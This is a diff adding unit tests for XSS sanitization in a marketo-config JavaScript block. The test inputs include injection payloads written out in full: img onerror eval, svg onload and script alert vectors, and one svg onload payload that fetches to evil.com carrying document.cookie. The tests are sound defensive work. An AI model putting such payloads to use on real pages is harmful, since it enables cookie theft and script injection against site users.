@@ -3,6 +3,7 @@ import { expect } from '@esm-bundle/chai';
 import { stub } from 'sinon';
 import { delay, waitForElement } from '../../helpers/waitfor.js';
 import init, { getDefaultStates, cleanPanelData, getConfigOptions } from '../../../libs/blocks/marketo-config/marketo-config.js';
+import { sanitizeConfigValue, sanitizeHashConfig } from '../../../libs/blocks/marketo-config/context.js';
 import { setConfig } from '../../../libs/utils/utils.js';
 
 const innerHTML = await readFile({ path: './mocks/body.html' });
@@ -138,6 +139,59 @@ describe('marketo-config', () => {
 
     const copyContent = copyBtn.querySelector('.copy-content');
     expect(copyContent.textContent).to.contain('http');
+  });
+
+  describe('sanitizeConfigValue (XSS prevention)', () => {
+    it('strips img onerror payload (the reported attack vector)', () => {
+      const result = sanitizeConfigValue('"><img src=x onerror=eval(top.name)>');
+      expect(result).to.not.include('<img');
+      expect(result).to.not.include('onerror');
+    });
+
+    it('strips HTML tags but preserves their text content', () => {
+      const result = sanitizeConfigValue('<script>alert(1)</script>');
+      expect(result).to.not.include('<script>');
+      expect(result).to.not.include('</script>');
+    });
+
+    it('strips svg onload attack vector', () => {
+      const result = sanitizeConfigValue('<svg onload=alert(1)>');
+      expect(result).to.not.include('<svg');
+      expect(result).to.not.include('onload');
+    });
+
+    it('preserves plain text values unchanged', () => {
+      expect(sanitizeConfigValue('Request a Demo')).to.equal('Request a Demo');
+      expect(sanitizeConfigValue('https://example.com/thank-you')).to.equal('https://example.com/thank-you');
+      expect(sanitizeConfigValue('')).to.equal('');
+    });
+
+    it('passes through non-string values unchanged', () => {
+      expect(sanitizeConfigValue(42)).to.equal(42);
+      expect(sanitizeConfigValue(null)).to.equal(null);
+      expect(sanitizeConfigValue(undefined)).to.equal(undefined);
+    });
+  });
+
+  describe('sanitizeHashConfig (XSS prevention)', () => {
+    it('strips HTML injection from cta.override and success.content (the reported attack)', () => {
+      const maliciousConfig = {
+        'form.cta.override': '"><img src=x onerror=eval(top.name)>',
+        'form.success.content': '<svg onload=fetch("//evil.com?c="+document.cookie)>',
+        'form.template': 'flex_contact',
+      };
+      const result = sanitizeHashConfig(maliciousConfig);
+      expect(result['form.cta.override']).to.not.include('<img');
+      expect(result['form.cta.override']).to.not.include('onerror');
+      expect(result['form.success.content']).to.not.include('<svg');
+      expect(result['form.success.content']).to.not.include('onload');
+      expect(result['form.template']).to.equal('flex_contact');
+    });
+
+    it('returns null/undefined config unchanged', () => {
+      expect(sanitizeHashConfig(null)).to.equal(null);
+      expect(sanitizeHashConfig(undefined)).to.equal(undefined);
+    });
   });
 
   it('resets to default state', async () => {
